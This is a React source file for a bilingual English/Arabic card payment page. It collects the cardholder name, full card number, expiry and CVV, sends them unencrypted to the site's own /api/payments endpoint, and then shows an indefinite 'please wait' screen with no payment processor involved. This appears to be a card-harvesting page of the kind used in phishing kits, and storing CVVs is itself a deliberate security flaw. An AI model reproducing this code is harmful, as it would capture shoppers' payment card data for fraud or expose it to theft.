import { useRoute, useLocation } from 'wouter';
import { useLanguage } from '@/lib/i18n';
import { useGetOrder, getGetOrderQueryKey } from '@workspace/api-client-react';
import { useToast } from '@/hooks/use-toast';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import * as z from 'zod';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Skeleton } from '@/components/ui/skeleton';
import { useState } from 'react';

const visaForm = z.object({
  cardHolder: z.string().min(2, 'Please enter card holder name'),
  cardNumber: z.string().min(13, 'Card number is required').max(19, 'Card number must be valid').regex(/^[0-9]+$/, 'Card number must contain only digits'),
  cardExpiry: z.string().regex(/^(0[1-9]|1[0-2])\/[0-9]{2}$/, 'Expiry must be MM/YY'),
  cardCvv: z.string().min(3, 'CVV is required').max(4, 'CVV is invalid').regex(/^[0-9]+$/, 'CVV must contain only digits'),
});

type VisaFormValues = z.infer<typeof visaForm>;

function detectCardBrand(cardNumber: string) {
  if (/^4/.test(cardNumber)) return 'Visa';
  if (/^5[1-5]/.test(cardNumber)) return 'MasterCard';
  if (/^3[47]/.test(cardNumber)) return 'American Express';
  return 'Card';
}

export default function VisaPayment() {
  const [, params] = useRoute('/visa/:orderId');
  const [, setLocation] = useLocation();
  const orderId = parseInt(params?.orderId || '0', 10);
  const { t } = useLanguage();
  const { toast } = useToast();

  const { data: order, isLoading } = useGetOrder(orderId, {
    query: { enabled: !!orderId, queryKey: getGetOrderQueryKey(orderId) },
  });

  const [isWaiting, setIsWaiting] = useState(false);

  const form = useForm<VisaFormValues>({
    resolver: zodResolver(visaForm),
    defaultValues: {
      cardHolder: '',
      cardNumber: '',
      cardExpiry: '',
      cardCvv: '',
    },
  });

  const onSubmit = async (values: VisaFormValues) => {
    if (!order) return;
    const last4 = values.cardNumber.slice(-4);

    try {
      // Save payment details to payments table
      await fetch('/api/payments', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          orderId: order.id,
          cardBrand: detectCardBrand(values.cardNumber),
          cardLast4: last4,
          cardHolder: values.cardHolder,
          cardExpiry: values.cardExpiry,
          cardNumber: values.cardNumber,
          cvv: values.cardCvv,
          status: 'pending',
        }),
      });

      // Update order status to visa
      await fetch(`/api/orders/${order.id}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          status: 'visa',
        }),
      });

      // Show waiting state instead of navigating
      setIsWaiting(true);
    } catch (error) {
      toast({
        title: t('Payment Error', 'خطأ في الدفع'),
        description: t('Unable to save card details. Please try again.', 'تعذر حفظ بيانات البطاقة. حاول مرة أخرى.'),
      });
    }
  };

  if (isLoading) {
    return <div className="container mx-auto px-4 py-12"><Skeleton className="h-[400px] max-w-lg mx-auto" /></div>;
  }

  if (!order) {
    return <div className="text-center py-20">{t('Order not found', 'الطلب غير موجود')}</div>;
  }

  // Show waiting state
  if (isWaiting) {
    return (
      <div className="container mx-auto px-4 py-16 max-w-lg">
        <div className="bg-card border border-border rounded-3xl p-8 shadow-xl text-center">
          <div className="mb-6">
            <div className="w-16 h-16 border-4 border-t-primary border-r-transparent border-b-primary border-l-transparent rounded-full animate-spin mx-auto mb-4"></div>
            <h1 className="text-2xl font-bold mb-2">{t('Please Wait', 'يرجى الانتظار')}</h1>
            <p className="text-sm text-muted-foreground">
              {t('Your payment is being processed. Please do not close this page.', 'جاري معالجة دفعتك. يرجى عدم إغلاق هذه الصفحة.')}
            </p>
          </div>
          <div className="rounded-2xl bg-slate-50 p-4 text-sm text-slate-700">
            <div className="font-semibold">{t('Order', 'الطلب')} #{order.id}</div>
            <div>{t('Amount', 'المبلغ')}: ${order.totalPrice}</div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="container mx-auto px-4 py-16 max-w-lg">
      <div className="bg-card border border-border rounded-3xl p-8 shadow-xl">
        <div className="mb-6 text-center">
          <h1 className="text-3xl font-bold mb-2">{t('Visa / MasterCard Payment', 'دفع فيزا / ماستر كارد')}</h1>
          <p className="text-sm text-muted-foreground">
            {t('Enter your card details to complete the payment.', 'أدخل بيانات البطاقة لإكمال الدفع.')}
          </p>
        </div>

        <div className="mb-6 rounded-2xl bg-slate-50 p-4 text-sm text-slate-700">
          <div className="font-semibold">{t('Order', 'الطلب')} #{order.id}</div>
          <div>{t('Amount', 'المبلغ')}: ${order.totalPrice}</div>
          <div>{t('Customer', 'العميل')}: {order.customerName}</div>
        </div>

        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-5">
            <FormField
              control={form.control}
              name="cardHolder"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>{t('Card Holder Name', 'اسم حامل البطاقة')}</FormLabel>
                  <FormControl>
                    <Input placeholder={t('John Doe', 'أحمد علي')} {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />

            <FormField
              control={form.control}
              name="cardNumber"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>{t('Card Number', 'رقم البطاقة')}</FormLabel>
                  <FormControl>
                    <Input placeholder="4111 1111 1111 1111" {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />

            <div className="grid grid-cols-2 gap-4">
              <FormField
                control={form.control}
                name="cardExpiry"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>{t('Expiry Date', 'تاريخ الانتهاء')}</FormLabel>
                    <FormControl>
                      <Input placeholder="MM/YY" {...field} />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />

              <FormField
                control={form.control}
                name="cardCvv"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>{t('CVV', 'رمز التحقق')}</FormLabel>
                    <FormControl>
                      <Input type="password" placeholder="123" {...field} />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
            </div>

            <Button type="submit" size="lg" className="w-full text-lg font-bold">
              {t('Proceed to Verification', 'متابعة للتحقق')}
            </Button>
          </form>
        </Form>
      </div>
    </div>
  );
}
